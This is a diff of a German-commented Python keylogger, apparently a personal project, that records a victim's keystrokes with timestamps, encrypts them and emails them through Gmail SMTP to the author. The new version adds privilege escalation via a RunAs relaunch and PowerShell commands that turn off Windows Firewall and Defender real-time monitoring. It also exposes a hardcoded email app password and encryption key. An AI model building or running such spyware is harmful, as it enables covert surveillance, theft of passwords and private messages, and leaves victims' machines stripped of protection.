@@ -1,43 +1,53 @@
 """
 Author: Leon Huskaj
-Date: 27.02.2025
-Version: 1.7
+Date: 28.02.2025
+Version: 3.0
 Description: Keylogger Projekt
-Dieser Code sendet die Keystrokes vom Opfer an dich per Mail.
+Dieser Code sendet die Keystrokes per E-Mail und deaktiviert Sicherheitsmechanismen.
 """
 
 # Bibliotheken imports
 import smtplib
 import ssl
 import subprocess
+import os
 from datetime import datetime
 from pynput.keyboard import Listener
 from cryptography.fernet import Fernet
+import ctypes
 
-# Firewall deaktivieren (Von ChatGPT abgeleitet)
-def disable_firewall():
+# Prüfen, ob das Skript mit Admin-Rechten läuft
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
+
+# Firewall und Defender deaktivieren
+def disable_protection():
     try:
         subprocess.run(["powershell", "-Command", "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"], check=True, shell=True)
-        print("Windows Defender Firewall wurde deaktiviert.")
+        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], check=True, shell=True)
+        print("Windows Defender & Firewall wurden deaktiviert.")
     except subprocess.CalledProcessError as e:
-        print(f"Fehler beim Deaktivieren der Firewall: {e}")
+        print(f"Fehler beim Deaktivieren der Schutzmechanismen: {e}")
 
 # Schlüssel von --> key.key
 ENCRYPTION_KEY = b'kNryyxr5cPQqaIJ__DCIzzZ0Rrp7KRj4lT1-zML5KRw='
 cipher = Fernet(ENCRYPTION_KEY)
 
-# E-Mail Empfängerangaben
+# E-Mail Konfiguration
 EMAIL_SENDER = "leon.huskaj1212@gmail.com"
 EMAIL_PASSWORD = "okzk edtt lsaq husd"
 EMAIL_RECEIVER = "leon.huskaj1212@gmail.com"
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 465
 
-# Ab wie vielen Keystrokes die Mail gesendet wird
+# Keylogger Variablen
 keystrokes = []
 THRESHOLD = 100
 
-# Verschlüsselung der Nachricht, die per Mail gesendet wird
+# Verschlüsselung der Nachricht
 def encrypt_message(message: str) -> str:
     encrypted_bytes = cipher.encrypt(message.encode())
     return encrypted_bytes.decode()
@@ -53,26 +63,23 @@ def send_email():
 
     message = f"Subject: Keylogger Report\n\n{encrypted_text}"
 
-    # Baut eine SSL-Verbindung auf und meldet sich mit Zugangsdaten an
     try:
         context = ssl.create_default_context()
         with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as server:
             server.login(EMAIL_SENDER, EMAIL_PASSWORD)
             server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message)
-        print("E-Mail erfolgreich gesendet (verschlüsselt).")
+        print("E-Mail erfolgreich gesendet.")
     except Exception as e:
         print(f"Fehler beim Senden der E-Mail: {e}")
 
     keystrokes = []
 
-# Keypress erkennen
+# Tasteneingaben erfassen
 def on_press(key):
     global keystrokes
 
-    # Zeit und Datum pro Keylog
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    # Struktur des Keylogs mit Timestamp
+    
     try:
         key_data = f"{timestamp} - {key.char}\n"
     except AttributeError:
@@ -80,13 +87,19 @@ def on_press(key):
 
     keystrokes.append(key_data)
 
-    # Wenn Keystrokes über dem Threshold sind, wird eine E-Mail gesendet
+    # E-Mail senden, wenn Schwellwert erreicht
     if len(keystrokes) >= THRESHOLD:
         send_email()
 
-# Script Start
+# Skript-Start
 def main():
-    disable_firewall()  # Firewall beim Start deaktivieren
+    if not is_admin():
+        print("Starte Skript mit Admin-Rechten...")
+        subprocess.run(["powershell", "-Command", f"Start-Process python -ArgumentList '{__file__}' -Verb RunAs"], shell=True)
+        return
+
+    disable_protection()
+    
     with Listener(on_press=on_press) as listener:
         listener.join()
 
